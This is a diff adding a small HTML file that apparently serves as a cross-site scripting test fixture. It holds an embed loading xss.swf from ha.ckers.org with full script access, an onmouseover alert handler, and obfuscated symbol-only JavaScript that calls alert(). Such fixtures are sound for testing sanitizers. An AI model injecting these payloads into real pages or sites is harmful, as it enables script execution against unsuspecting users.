@@ -1,0 +1,29 @@
+<html>
+    <head>
+    </head>
+    <body>
+        <embed SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></embed>
+        <embed SRC="xss.swf" AllowScriptAccess="always"></embed>
+
+        <div
+            style="height:200px;width:200px;background-color:red;"
+            onmouseover=alert(1)
+            class="onmouseover=alert('Thanx')">
+            MouseOverMe
+        </div>
+
+        <script>
+            ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
+
+            <!-- sort() -->
+            ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()
+            ($=[$=[]][
+                (__=!$+$)
+                [_=-~-~-~$] + ({}+$)[_/_] + ($$=($_=!''+$)[_/_] + $_[+$])
+            ])()
+
+            <!-- alert() -->
+            [__[_/_]+__[_+~$]+$_[_]+$$](_/_)
+        </script>
+    </body>
+</html>
